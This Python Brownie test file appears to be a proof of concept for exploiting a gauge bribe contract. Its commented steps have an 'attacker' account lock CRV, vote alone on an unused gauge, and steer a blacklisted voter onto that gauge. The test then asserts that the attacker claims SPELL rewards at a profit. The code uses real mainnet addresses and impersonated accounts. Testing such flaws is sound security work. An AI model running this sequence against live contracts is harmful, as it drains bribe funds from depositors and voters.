import brownie
from brownie import Contract, accounts, chain
import pytest

def test_fees(
    token1, token2, token1_whale, bribe, gov, user,
    token2_whale, gauge1, gauge2, gauge_controller, voter1, voter2
):
    attacker = accounts.at("0xd2D43555134dC575BF7279F4bA18809645dB0F1D", force=True)
    blacklist_voter = accounts.at("0x989AEb4d175e16225E39E87d0D97A3360524AD80", force=True)
    ve = Contract("0x5f3b5DfEb7B28CDbD7FAba78963EE202a494e2A2")
    spell = Contract("0x090185f2135308BaD17527004364eBcC2D37e5F6")
    crv = Contract("0xD533a949740bb3306d119CC777fa900bA034cd52")
    noone_gauge= Contract("0x4dC4A289a8E33600D8bD4cf5F6313E43a37adec7")
    spell_holder = accounts.at("0x26FA3fFFB6EfE8c1E69103aCb4044C26B9A106a9", force=True)

    convex_1_percent = 28_500 *1e18
    
    #wait 2 weeks so we are sure timelocks are over
    chain.sleep(2*7*24*60*60)
    chain.mine(1)

    spell_spent = 10_000_000 * 1e18
    attacker_beginning_spell_balance = spell.balanceOf(attacker)

    #attacker needs more crv than 1/10_000 of convex's veCRV locked for four years
    amount = convex_1_percent + 10_000*1e18
    amount = 29_000e18
    #attacker deposits their crv to ve. then locks for 4 years. then votes on the gauge
    crv.approve(ve, amount, {'from': attacker})
    ve.create_lock(amount, chain.time() + 24*60*60*365*4, {'from': attacker})

    #this gauge has no votes so far. attacker is only voter
    gauge_controller.vote_for_gauge_weights(noone_gauge, 10_000, {'from': attacker} )
    gauge_controller.checkpoint_gauge(noone_gauge, {'from': attacker})

    #some small amount of spell is added to the bribe contract.
    #if no other actions are taken the attacker would be able to claim all of this spell as they are the only voter
    spell.approve(bribe, spell_spent, {'from': spell_holder})
    tx = bribe.add_reward_amount(noone_gauge, spell, spell_spent, {'from': spell_holder})
    bribe_amount_after_fee = tx.events['RewardAdded']['amount']
    # spell.approve(bribev3, 150_000_000e18,{'from':'0xDF2C270f610Dc35d8fFDA5B453E74db5471E126B'})
    # bribev3.add_reward_amount('0xd8b712d29381748dB89c36BCa0138d7c75866ddF', spell, 150_000_000e18, {'from': '0xDF2C270f610Dc35d8fFDA5B453E74db5471E126B'})
    ms = '0xDF2C270f610Dc35d8fFDA5B453E74db5471E126B'
    spell.transfer(bribe, spell.balanceOf(ms), {'from': ms})
    #wait a week. the blacklist vote must be in the next period
    chain.sleep(7*24*60*60)
    #get the blacklist voter to vote with some amount of their vecrv on the poisoned gauge. not we first vote another gauge to 0
    gauge_controller.vote_for_gauge_weights("0x72E158d38dbd50A483501c24f792bDAAA3e7D55C", 0, {'from': blacklist_voter} )
    gauge_controller.vote_for_gauge_weights(noone_gauge, 1, {'from': blacklist_voter} )

    # attacker now claims their reward
    tx = bribe.claim_reward(noone_gauge, spell, {'from': attacker})
    amount_claimed = tx.events['RewardClaimed']['amount']
    #attackers gets out more spell out at the end than the beginning
    print("attacker makes a profit of: ",  (spell.balanceOf(attacker)-attacker_beginning_spell_balance)/1e18, "Spell" )
    assert spell.balanceOf(attacker) > attacker_beginning_spell_balance
    assert amount_claimed <= bribe_amount_after_fee
    print(f'Claimed: {amount_claimed/1e18} | Bribed: {bribe_amount_after_fee/1e18}')